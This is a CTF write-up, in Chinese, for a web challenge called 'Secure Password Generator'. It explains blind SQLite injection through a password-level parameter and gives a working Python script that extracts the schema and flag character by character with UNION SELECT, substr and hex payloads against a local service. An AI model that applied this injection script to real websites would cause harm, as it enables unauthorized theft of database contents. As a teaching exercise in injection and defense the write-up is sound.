# Secure Password Generator

**Author:** tel

**Difficulty:** Hard

**Category:** Web

## 题目描述

这是我的密码生成器，我更喜欢 Baby，生成出来的密码没有人能爆破成功，你呢？糟糕，你不会喜欢我放在数据库里的 flag 吧？

## 题目解析

**暴露端口：`80`**

一道 sqlite 盲注题，flag 在数据库中，我们通过返回的密码复杂程度或者返回的时间，从而来判断注入是否正确

1. `select group_concat(sql) from sqlite_master where type='table'` 由于是 sqlite 数据库，我们可以直接使用这一语句来获取创建数据表时候的 `CREATE` 语句，**直接拿到字段名和表名，甚至还有插入的 FLAG**

2. `substr((),1,1)` 常用的这个函数，对获取的数据进行截断，截取数据中的第一位数据

3. `hex(substr((),1,1))` sqlite 中没有像 mysql 一样的 ascii 函数，所以我们使用 hex 来进行编码

此处需要注意 `hex("l") => 6C` 这里是大写字母 `C`，而我们 python `hex(108) => 0x6c` 是小写的 `c`，这个地方需要进行大写处理 `hex(j)[2:].upper()`

```py
import requests
import time
url = "http://127.0.0.1:3000/randomPassword?level="

escape_chars = ['/','\'','[',']','%','&','_','(',')']
table_name = "flag,level"
sql = "CREATE TABLE flag(        fl4g_1s_HeR3"
flag = ""
for i in range(1,30):
    for j in range(32,127):

        # payload = "-1'union select hex(substr((select group_concat(tbl_name) FROM sqlite_master where type='table' and tbl_name NOT like 'sqlite_%%'),%s,1))='%s'--" % (i,hex(j)[2:].upper())
        # payload = "-1'union select hex(substr((select group_concat(sql) from sqlite_master where type='table'),%s,1))='%s'--" % (i,hex(j)[2:].upper())
        payload = "-1'union select hex(substr((select group_concat(fl4g_1s_HeR3) from flag),%s,1))='%s'--" % (i,hex(j)[2:].upper())

        r = requests.get(url + payload).text
        index = r.index("<div class=\"result\">")+len("<div class=\"result\">")
        password = r[index:index+5]
        time.sleep(0.1)
        if password.isalpha():
            flag += chr(j)
            print(flag)
            # exit()
            break
```
